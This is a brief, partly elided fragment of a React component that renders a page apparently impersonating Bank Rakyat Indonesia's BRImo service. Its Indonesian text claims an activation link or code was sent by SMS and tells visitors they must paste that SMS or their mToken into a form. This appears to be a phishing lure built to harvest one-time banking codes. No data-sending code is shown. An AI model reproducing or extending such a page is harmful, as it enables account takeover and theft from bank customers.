...
const SiteVerifikasi = ({btnClick}) => {
  ...
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        ...
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link/kode untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan/kode lalu tempel dibawah ini</h1>    
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Tempel sms/kode BRI (Wajib)</h1>    
        <form>
            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Silahkan masukkan sms atau mToken disini"></textarea>
